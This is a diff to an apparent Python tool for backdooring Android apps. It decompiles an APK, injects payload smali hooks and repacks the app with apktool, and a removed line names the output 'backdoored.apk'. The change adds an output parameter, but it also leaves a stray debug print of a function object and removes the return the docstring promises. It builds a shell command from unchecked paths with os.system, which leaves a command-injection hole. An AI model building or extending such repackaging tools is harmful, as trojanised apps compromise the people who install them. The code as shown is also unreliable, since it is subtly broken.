@@ -23,7 +23,7 @@ def decompile_apk(apkPath):
         return None
     return outDir
 
-def repack_apk(decompiled_path, hooks):
+def repack_apk(decompiled_path, hooks, output):
     """
     Build/Repack the decompiled application given as parameter.
 
@@ -33,16 +33,18 @@ def repack_apk(decompiled_path, hooks):
     :param hooks: The hooks we inserted beforehand. Those contain the paths to the smali files we need to copy.
     :type hooks: :type hooks: [:class:'hookmanager.Hook']
 
+    :param output: The path where we should write the output to.
+    :type output: str
+
     :return The path to the repacked .apk file.
             None is returned on any errors.
     """
+    print(decompile_apk)
     if not os.path.isdir(decompiled_path):
         return None
 
     __inject_payload(decompiled_path, hooks)
-    repackedApk = "backdoored.apk"
-    os.system("apktool b -o {} {}".format(repackedApk, decompiled_path))
-    return repackedApk
+    os.system("apktool b -o {} {}".format(output, decompiled_path))
 
 def __inject_payload(original_apk, hooks):
     """
